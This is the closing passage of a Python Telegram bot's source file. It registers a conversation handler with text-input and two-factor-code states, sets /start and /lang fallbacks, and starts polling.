                CallbackQueryHandler(handle_callback),
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_text),
            ],
            WAITING_2FA_CODE: [
                # Обработка кода 2FA от пользователя
                CallbackQueryHandler(receive_2fa_code),  # кнопка "Отмена"
                MessageHandler(filters.TEXT & ~filters.COMMAND, receive_2fa_code),
            ],
            # WAITING_ADMIN_BROADCAST убрано (состояние не реализовано)
        },
        fallbacks=[CommandHandler("start", start), CommandHandler("lang", lang_command)],
        per_user=True, per_chat=True, block=False,
    )
    application.add_handler(conv)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
